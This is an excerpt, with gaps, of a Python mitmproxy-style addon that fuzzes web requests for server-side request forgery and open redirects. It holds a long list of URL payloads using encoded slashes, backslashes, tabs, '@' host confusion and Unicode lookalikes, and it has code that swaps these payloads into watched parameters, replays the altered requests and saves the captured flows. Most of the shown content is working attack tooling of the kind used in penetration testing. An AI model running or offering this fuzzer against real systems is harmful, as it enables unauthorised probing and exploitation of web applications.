...
class SSRF:
    def __init__(self):
        self.custom_srf_flow_dir = "SSRF_flows"
        os.makedirs(self.custom_srf_flow_dir, exist_ok=True)

        # Corrected the invalid escape sequences and changed some strings to raw strings
        self.custom_srf_payloads = [
    "//www.example.com/%2f..",
    r"//{host}@www.example.com/%2f..",
    "///www.example.com/%2f..",
    "https://www.example.com",
    r"///{host}@www.example.com/%2f..",
    "////www.example.com/%2f..",
    r"////{host}@www.example.com/%2f..",
    "https://www.example.com/%2f..",
    r"https://{host}@www.example.com/%2f..",
    "/https://www.example.com/%2f..",
    r"/https://{host}@www.example.com/%2f..",
    "//www.example.com/%2f%2e%2e",
    r"//{host}@www.example.com/%2f%2e%2e",
    "///www.example.com/%2f%2e%2e",
    r"///{host}@www.example.com/%2f%2e%2e",
    "////www.example.com/%2f%2e%2e",
    r"////{host}@www.example.com/%2f%2e%2e",
    "https://www.example.com/%2f%2e%2e",
    r"https://{host}@www.example.com/%2f%2e%2e",
    "/https://www.example.com/%2f%2e%2e",
    r"/https://{host}@www.example.com/%2f%2e%2e",
    "//www.example.com/",
    ...
    "//https://www.example.com//",
    r"//https://{host}@www.example.com//",
    "//www.example.com/%2e%2e%2f",
    r"//{host}@www.example.com/%2e%2e%2f",
    "///www.example.com/%2e%2e%2f",
    r"///{host}@www.example.com/%2e%2e%2f",
    "////www.example.com/%2e%2e%2f",
    r"////{host}@www.example.com/%2e%2e%2f",
    "https://www.example.com/%2e%2e%2f",
    r"https://{host}@www.example.com/%2e%2e%2f",
    "//https://www.example.com/%2e%2e%2f",
    r"//https://{host}@www.example.com/%2e%2e%2f",
    "///www.example.com/%2e%2e",
    r"///{host}@www.example.com/%2e%2e",
    "////www.example.com/%2e%2e",
    r"////{host}@www.example.com/%2e%2e",
    "https:///www.example.com/%2e%2e",
    r"https:///{host}@www.example.com/%2e%2e",
    "//https:///www.example.com/%2e%2e",
    r"//{host}@https:///www.example.com/%2e%2e",
    "/https://www.example.com/%2e%2e",
    r"/https://{host}@www.example.com/%2e%2e",
    "///www.example.com/%2f%2e%2e",
    r"///{host}@www.example.com/%2f%2e%2e",
    ...
    "////%09/www.example.com",
    r"////%09/{host}@www.example.com",
    "https://%09/www.example.com",
    r"https://%09/{host}@www.example.com",
    "/%5cwww.example.com",
    r"/%5c{host}@www.example.com",
    "//%5cwww.example.com",
    r"//%5c{host}@www.example.com",
    "///%5cwww.example.com",
    r"///%5c{host}@www.example.com",
    "////%5cwww.example.com",
    r"////%5c{host}@www.example.com",
    "https://%5cwww.example.com",
    r"https://%5c{host}@www.example.com",
    "/https://%5cwww.example.com",
    r"/https://%5c{host}@www.example.com",
    "https://www.example.com",
    r"https://{host}@www.example.com",
    ...
    r"\/\/www.example.com/",
    r"/\/wwww.example.com/",
    r"https://{host}/https://www.example.com/",
    "〱www.example.com",
    "〵www.example.com",
    "ゝwww.example.com",
    "ーwww.example.com",
    ...
    def process_parameters_ssrf(self, flow):
        ...
        for watched_param in self.custom_srf_watched_params:
            if watched_param in params:
                value = params[watched_param][0] if isinstance(params[watched_param], list) else params[watched_param]
                self.alter_and_replay_ssrf(flow, watched_param, value)

    def alter_and_replay_ssrf(self, original_flow, param, original_value):
        host = original_flow.request.host
        for template in self.custom_srf_payloads:
            altered_value = template.format(host=host)  
            altered_flow = self.alter_request_ssrf(original_flow, param, altered_value)
            if altered_flow:
        ...
        if original_flow.request.method == "GET":
            ...
            if "application/x-www-form-urlencoded" in content_type:
                ...
                try:
                    ...
                    pass
        new_request.headers[self.custom_srf_altered_header] = "true"
    ...
    def save_flow_ssrf(self, flow):
        filename = os.path.join(self.custom_srf_flow_dir, f"custom_srf_captured_request{int(time.time())}.mitm")
        try:
